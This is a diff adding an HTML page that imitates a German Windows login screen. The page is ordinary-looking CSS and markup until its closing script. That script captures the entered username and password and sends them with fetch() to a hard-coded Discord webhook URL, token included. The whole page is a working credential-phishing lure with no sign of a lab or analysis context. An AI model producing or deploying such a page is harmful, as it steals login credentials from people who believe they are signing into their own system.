@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Login Screen</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #0078D4; /* Windows-Blau */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 20px;
+        }
+
+        .login-container {
+            text-align: center;
+            width: 400px; /* Schmalere Breite für den Container */
+        }
+
+        .profile-picture {
+            background-color: #D3D3D3; /* Hellgrauer Kreis */
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            margin: 0 auto;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .profile-picture img {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+        }
+
+        h2 {
+            font-size: 42px; /* Größerer Text für "Anderer Benutzer" */
+            margin-bottom: 30px;
+            font-weight: 200; /* Kein Fettdruck mehr */
+        }
+
+        .input-container {
+            position: relative;
+            width: 80%; /* Schmalere Eingabefelder */
+            margin: 0 auto 20px; /* Zentriert mit Abstand */
+        }
+        .input-container input {
+            font-size: 16px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding-top: 5px; /* Weniger Höhe durch reduzierte Polsterung */
+            margin: 12px 0px;
+            border: 2px solid #CCCCCC; /* Dünner grauer Rahmen */
+            font-size: 18px;
+            box-shadow: none; /* Kein Schatten */
+            border-radius: 0; /* Keine abgerundeten Ecken */
+            background-color: white;
+            color: black;
+        }
+
+        .input-field:focus {
+            border-color: #999999;
+        }
+		
+		#kennwort-container{
+			margin-left: 10%;
+			width: 72%;
+		}
+		
+		::placeholder{
+			color: #636363;
+			font-size: 14px;
+		}
+		
+		::-ms-input-placeholder { /* Edge 12 -18 */
+			color: #636363;
+			font-size: 14px;
+		}
+
+        .enter-icon {
+            position: absolute;
+            right: -15%; /* Pfeil ganz rechts am Rand */
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: #6d6d6d;
+            border: 2px solid #727272;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 3px 5px; /* Größerer rechter Abstand für den Pfeil */
+            border-radius: 0;
+        }
+
+        .enter-icon:hover {
+            background-color: #7d7d7d;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #0078D4;
+            border: none;
+            border-radius: 0;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .login-btn:hover {
+            background-color: #005a9e;
+        }
+
+        .small-text {
+            font-size: 14px;
+            color: white;
+            margin-top: 20px;
+            line-height: 1.4;
+        }
+
+        .small-text br {
+            display: block; /* Zeilenumbruch im Text */
+        }
+
+        .small-text .spacer {
+            margin-bottom: 8px; /* Leerer Abstand zwischen den Zeilen */
+        }
+
+        .fake-link:hover{
+            color: #005a9e;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <div class="profile-picture">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/99/Sample_User_Icon.png" alt="User Profile">
+        </div>
+        <h2>Anderer Benutzer</h2>
+        <form id="login-form">
+            <div class="input-container">
+                <input type="text" class="input-field" id="benutzername" placeholder="Benutzername" required>
+            </div>
+            <div class="input-container" id="kennwort-container">
+                <input type="password" class="input-field" id="kennwort" placeholder="Kennwort" required>
+                <!-- Pfeil (Enter-Button) -->
+                <button type="button" class="enter-icon" id="submit-btn">→</button>
+            </div>
+        </form>
+        <!-- Zusätzlicher Text -->
+        <div class="small-text">
+            Anmelden an: MTS
+            <div class="spacer"></div> <!-- Leerer Abstand zwischen den Zeilen -->
+            <p class="fake-link">Wie melden Sie sich an einer anderen<br>Domäne an?</p>
+        </div>
+    </div>
+
+    <script>
+        // Funktion zum Senden der Daten an den Webhook
+        function sendToWebhook() {
+            // Holen der Werte aus den Eingabefeldern
+            const benutzername = document.getElementById('benutzername').value;
+            const kennwort = document.getElementById('kennwort').value;
+
+            // Daten an den Discord Webhook senden
+            const webhookUrl = "https://ptb.discord.com/api/webhooks/1287795288832217161/z4EUosBRF7zVrvSiQ0VaQPPmreH02IvC6NVPq3eRciLFs7-QMEHGrTPsBdITlmFrY2bv";
+            const payload = {
+                content: `Benutzername: ${benutzername}\nKennwort: ${kennwort}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        // Event Listener für den Button-Klick
+        document.getElementById('submit-btn').addEventListener('click', function(event) {
+            event.preventDefault(); // Verhindert das Neuladen der Seite
+            sendToWebhook();
+        });
+
+        // Event Listener für Enter-Taste im Formular
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Verhindert das Neuladen der Seite
+            sendToWebhook();
+        });
+    </script>
+
+</body>
+</html>
